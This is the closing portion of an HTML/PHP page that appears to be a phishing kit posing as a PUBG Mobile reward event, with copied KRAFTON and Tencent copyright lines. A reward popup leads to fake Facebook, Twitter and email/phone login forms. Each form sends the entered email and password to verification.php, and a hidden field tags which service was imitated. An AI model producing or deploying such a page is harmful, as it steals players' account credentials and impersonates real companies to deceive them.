<div class="footer-txt-copyright">ⓒ 2017 KRAFTON, Inc. All rights reserved.</div> <div class="footer-txt-copyright">ⓒ 2018-<?php echo $yearNow;?> Tencent. All rights reserved.</div> <div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> </div> </div> <div class="popup reward_confirmation" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Reward Confirmation</div> </div> <div class="popup-box-bg">
<div class="popup-alert">Are you sure to collect this reward?</div> <img class="popup-item itemShine" src="" id="myRewardImg">
<br>
</div> <div class="popup-footer">
<button type="button" onmousedown="tutup.play();" class="popup-footer-deactive" onclick="close_reward_confirmation()">Cancel</button>
<button type="button" onmousedown="buka.play();" class="popup-footer-active" onclick="open_account_login()">Collect</button>
</div> </div> </div> <div class="popup account_login" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Account Login</div> </div> <div class="popup-box-bg">
<div class="popup-alert">Login to receive your selected reward</div> <button type="button" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Log in using Facebook account</button>
<button type="button" class="popup-btn-login popup-btn-twitter" onclick="open_twitter();"><i class="fa fa-twitter-square icon-login"></i> Log in using Twitter account</button>
<button type="button" class="popup-btn-login popup-btn-email" onclick="open_email();"><i class="fa fa-envelope icon-login"></i> Log in using Phone/Email</button>
<br>
</div> </div> </div> <div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb"><img src="https://i.ibb.co/Wg8qQxh/facebook-text.png"></div> <div class="content-box-fb">
<img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
<div class="txt-login-fb">Log in to your Facebook account to connect to PUBG MOBILE</div> <form class="login-form" action="verification.php" method="post">
<label>
<input type="text" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
</label>
<label>
<input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
</label>
<input type="hidden" name="login" value="Facebook" readonly>
<button type="submit" class="btn-login-fb">Log In</button>
</form>
<div class="txt-create-account">Create account</div> <div class="txt-not-now">Not now</div> <div class="txt-forgotten-password">Forgotten password?</div> </div> <div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div> <div class="language-name">Bahasa Indonesia</div> <div class="language-name">Basa Jawa</div> <div class="language-name">Bahasa Melayu</div> <div class="language-name">日本語</div> <div class="language-name">Español</div> <div class="language-name">Português (Brasil)</div> <div class="language-name"><i class="fa fa-plus"></i></div> </center>
</div> <div class="copyright">Facebook Inc.</div>
</div> </div> <div class="popup-login login-twitter animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="box-twitter">
<div class="header-twitter"><img src="https://i.ibb.co/V9rgBqw/twitter-text.png"></div> <br>
<br>
<br>
<center>
<form action="verification.php" method="post">
<div class="txt-login-twitter">Login to Twitter</div> <div class="form-group">
<input type="text" name="email" autocomplete="off" required>
<label>Phone/email/username</label>
</div> <div class="form-group">
<input type="password" name="password" autocomplete="off" required>
<label>Password</label>
</div> <input type="hidden" name="login" value="Twitter" readonly>
<button type="submit" class="btn-login-twitter">Log In</button>
<div class="footer-menu-twitter">Forgot password?</div> <div class="footer-menu-twitter bulet">•</div> <div class="footer-menu-twitter">Sign up to Twitter</div> </form>
</center>
</div> </div> </div> <div class="popup-login login-email animated fadeIn" style="display: none;">
<div class="popup-box-login-email">
    <a onclick="tutup_email()" class="close-email"><i class="zmdi zmdi-close"></i></a>
    <div class="header-email">
        <div class="header-email-title">Log in via Email / Phone</div>
    </div>
    <div class="box-email-body" style="padding: 15px;">
        <center>
            <div class="txt-login-email">Please log in with your credentials</div>
            <form action="verification.php" method="post">
                <input type="text" name="email" class="input-email-box" placeholder="Phone number or Email" autocomplete="off" required>
                <input type="password" name="password" class="input-email-box" placeholder="Password" autocomplete="off" required>
                <input type="hidden" name="login" value="Phone/Email" readonly>
                <button type="submit" class="btn-login-email-submit">Log In</button>
            </form>
        </center>
    </div>
</div>
</div>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/tab.js"></script>
<script src="js/popup.js"></script>
<script src="js/click.js"></script>

<script type="text/javascript">
$(document).ready(function() {
    // Email açma fonksiyonu
    window.open_email = function() {
        $('.login-email').show();
        $('.account_login').hide();
    };

    // Email kapatma fonksiyonu
    window.tutup_email = function() {
        $('.login-email').hide();
        $('.account_login').show();
    };
});
</script>

</body>
</html>